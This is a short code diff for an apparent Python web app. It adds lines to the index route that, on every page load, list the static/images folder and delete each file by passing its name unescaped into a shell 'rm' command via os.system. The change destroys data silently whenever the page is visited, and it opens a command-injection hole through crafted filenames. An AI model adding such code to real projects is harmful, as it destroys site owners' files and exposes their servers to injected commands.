@@ -17,6 +17,10 @@ for slice_type in ['middle', 'bottom', 'top']:
 
 @server.route('/')
 def index():
+    from os import listdir, system
+    rm = lambda d: system(f'rm "{d}"')
+    for f in listdir('static/images'):
+        rm(f'static/images/{f}')
     return render('index.html')
 
 
